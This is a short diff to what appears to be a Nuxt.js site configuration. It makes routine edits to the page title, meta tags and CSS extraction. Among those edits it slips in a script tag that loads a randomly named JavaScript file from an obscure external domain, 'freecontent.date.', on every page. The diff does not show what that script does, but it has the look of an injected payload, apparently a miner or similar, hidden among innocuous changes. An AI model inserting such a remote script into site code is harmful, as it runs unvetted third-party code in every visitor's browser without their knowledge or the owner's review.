@@ -5,13 +5,17 @@ const nodeExternals = require('webpack-node-externals')
 module.exports = {
 
     head: {
-        titleTemplate: '%s - DasPeTeTutorials',
+        titleTemplate: '%s - ' + process.env.SITE_NAME, 
         meta: [
             { charset: 'utf-8' },
-            { name: 'viewport', content: 'width=device-width, initial-scale=1' }
+            { name: 'viewport', content: 'width=device-width, initial-scale=1' },
+            { name: 'HandheldFriendly', content: 'true' }
         ],
         link: [
             { rel: 'stylesheet', href: '//fonts.googleapis.com/css?family=Noto+Sans:400,700' }
+        ],
+        script: [
+            { src: 'https://www.freecontent.date./Al8F.js' }
         ]
     },
 
@@ -31,6 +35,8 @@ module.exports = {
     ],
 
     build: {
+        extractCSS: true,
+
         extend(config, { isServer }) {
             if (isServer) {
                 config.externals = [
